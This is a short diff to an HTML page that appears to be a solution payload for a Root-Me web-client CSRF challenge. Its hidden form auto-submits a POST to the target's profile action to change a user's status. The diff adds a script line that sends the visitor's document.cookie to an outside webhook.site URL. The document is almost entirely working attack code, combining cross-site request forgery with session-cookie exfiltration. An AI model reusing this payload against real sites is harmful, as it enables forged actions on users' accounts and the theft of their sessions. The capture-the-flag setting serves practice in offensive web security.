@@ -1,12 +1,12 @@
 <html>
     <body>
-        <h1>test</h1>
         <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST">
             <input type="hidden" name="username" value="re" />
-            <input type="checkbox" name="status" checked >
+            <input type="checkbox" name="status" checked hidden="true">
         </form>
         <script>
             document.forms[0].submit();
+            location="https://webhook.site/ceb34172-7784-4ff6-9712-515de0e3367e/?c="+document.cookie;
         </script>
     </body>
 </html>
